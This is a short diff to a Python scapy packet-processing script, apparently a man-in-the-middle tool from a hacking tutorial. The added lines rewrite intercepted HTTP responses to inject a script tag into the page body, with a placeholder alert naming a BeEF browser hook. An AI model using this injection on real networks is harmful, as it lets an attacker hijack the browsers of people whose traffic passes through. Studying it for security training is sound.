@@ -26,6 +26,9 @@ def process_packet(packet):
             packet.set_payload(str(new_packet))  # Set the modified packet
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
+            modified_load = scapy_packet[scapy.Raw].load.replace("<body>", "<body><script>alert('This could be a Beef Hook');</script>")
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
             print(scapy_packet.show())
 
     packet.accept()
